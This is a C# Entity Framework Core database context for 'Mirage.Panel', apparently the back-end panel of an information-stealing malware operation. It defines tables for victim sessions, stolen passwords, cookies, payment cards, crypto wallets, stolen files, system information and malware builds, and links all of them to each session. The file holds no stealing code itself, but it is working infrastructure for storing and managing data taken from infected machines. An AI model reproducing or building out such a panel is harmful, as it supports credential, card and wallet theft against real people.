using Microsoft.EntityFrameworkCore;
using Mirage.Panel.Models;

namespace Mirage.Panel.Data;

public class AppDbContext : DbContext
{
    public DbSet<Session> Sessions => Set<Session>();
    public DbSet<Password> Passwords => Set<Password>();
    public DbSet<Cookie> Cookies => Set<Cookie>();
    public DbSet<Card> Cards => Set<Card>();
    public DbSet<Wallet> Wallets => Set<Wallet>();
    public DbSet<StolenFile> StolenFiles => Set<StolenFile>();
    public DbSet<Models.SystemInfo> SystemInfos => Set<Models.SystemInfo>();
    public DbSet<Build> Builds => Set<Build>();

    protected override void OnConfiguring(DbContextOptionsBuilder options)
    {
        options.UseSqlite("Data Source=mirage_panel.db");
    }

    protected override void OnModelCreating(ModelBuilder model)
    {
        model.Entity<Session>(e =>
        {
            e.HasMany(s => s.Passwords).WithOne().HasForeignKey(p => p.SessionId);
            e.HasMany(s => s.Cookies).WithOne().HasForeignKey(c => c.SessionId);
            e.HasMany(s => s.Cards).WithOne().HasForeignKey(c => c.SessionId);
            e.HasMany(s => s.Wallets).WithOne().HasForeignKey(w => w.SessionId);
            e.HasMany(s => s.Files).WithOne().HasForeignKey(f => f.SessionId);
            e.HasOne(s => s.SystemInfo).WithOne().HasForeignKey<Models.SystemInfo>(si => si.SessionId);
        });
    }
}
